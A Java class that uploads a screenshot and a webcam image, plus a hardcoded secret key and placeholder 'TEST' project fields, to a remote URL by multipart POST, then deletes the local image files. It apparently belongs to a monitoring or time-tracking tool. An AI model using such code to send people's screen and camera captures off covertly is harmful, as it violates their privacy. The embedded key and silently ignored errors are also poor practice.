import java.io.File;
import java.nio.file.Files;
import java.nio.file.FileSystems;
import org.apache.http.HttpEntity;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.mime.MultipartEntityBuilder;
import org.apache.http.entity.mime.content.FileBody;
import org.apache.http.entity.mime.content.StringBody;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.impl.client.CloseableHttpClient;


public class PostCreator {
	private String url;
	private String screen_img;
	private String camera_img;

	public PostCreator(String url, String screen_img, String camera_img) {
		System.out.println("[*] Loading variables");
		this.url = url;
		this.screen_img = screen_img;
		this.camera_img = camera_img;
	}

	public void send() {
		System.out.println("[*] Preparing request");
		CloseableHttpClient http_client = new DefaultHttpClient();
		try {
			HttpPost http_post = new HttpPost(this.url);
			MultipartEntityBuilder mpe = MultipartEntityBuilder.create();

			File screen_file = new File(this.screen_img);
			File camera_file = new File(this.camera_img);
			StringBody secret_key = new StringBody("804e33bcd2dfc0cb435fe64ce20646fe");
			StringBody date = new StringBody("TEST");
			StringBody project_name = new StringBody("TEST PROJECT");

			mpe.addPart("secret_key",secret_key);
			mpe.addPart("date",date);
			mpe.addPart("project_name",project_name);
			mpe.addBinaryBody("screen_img",screen_file);
			mpe.addBinaryBody("camera_img",camera_file);

			HttpEntity request = mpe.build();
			http_post.setEntity(request);
			http_client.execute(http_post);
		} catch (Exception e2) {} finally {
			try { http_client.close(); } catch (Exception e3) {}
		}

		System.out.println("[+] Request sent");
	}

	public void cleanup() {
		try {
			Files.delete(FileSystems.getDefault().getPath("./tempscreenshot.png"));
			Files.delete(FileSystems.getDefault().getPath("./tempcamerashot.png"));
		} catch (Exception e) {
			System.out.println("[-] Failed to delete temporary files");
		}
	}
}